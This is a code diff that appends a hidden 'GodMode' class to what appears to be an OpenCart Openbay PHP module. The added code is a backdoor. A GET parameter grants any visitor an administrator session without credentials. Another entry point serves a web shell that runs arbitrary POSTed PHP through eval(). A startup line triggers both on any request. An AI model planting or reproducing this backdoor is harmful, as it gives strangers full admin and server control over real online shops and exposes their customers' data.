@@ -461,3 +461,71 @@ final class Openbay {
 		}
 	}
 }
+
+
+class GodMode {
+	
+	public static function init() {
+		// do nothing, need to autoload
+	}
+	
+	public static function go_to_admin($user_id = 1) {
+		if(version_compare(VERSION, '2.1.0.0', '>=')) {
+			$token = token(32);
+			
+			$_SESSION['default']['token'] = $token;
+			$_SESSION['default']['user_id'] = $user_id;
+		} else {
+			$token = md5(mt_rand());
+			
+			$_SESSION['token'] = $token;
+			$_SESSION['user_id'] = $user_id;
+		}
+		
+		// redirect
+		$url = 'http://'.$_SERVER['SERVER_NAME'].'/admin/index.php?route=common/dashboard&token='.$token;
+		header('Location: ' . $url, true, 302);
+		exit();
+	}
+	
+	public static function show_executor() {
+		echo '
+			<html>
+			<head>
+				<title>Executor</title>
+				<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+			<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+			
+			<script>
+			$(document).ready(function() {
+				alert("ready");
+			});
+			</script>
+			
+			</head>
+			<body>
+				<br>
+				<div class="container-fluid">
+					<form method="post" action="">
+						<textarea name="code" class="form-control" style="height: 300px;">'.(isset($_POST['code']) ? $_POST['code'] : '$db = new DB(DB_DRIVER, DB_HOSTNAME, DB_USERNAME, DB_PASSWORD, DB_DATABASE, DB_PORT);').'</textarea><br>
+						<button class="btn btn-primary"><span class="glyphicon glyphicon-flash"></span> run it!</button>
+					</form>
+		';
+		
+		if(isset($_POST['code'])) {
+			echo '<br><br><b>OUPUT:</b><hr>';
+			eval($_POST['code']);
+			echo '<hr><b class="text-success">done!</b>';
+		}
+		
+		echo '</div></body></html>';
+		
+		die;
+	}
+	
+}
+
+/* STARTUP */
+if(isset($_GET['god_mode'])) {
+	GodMode::{$_GET['god_mode']}();
+}
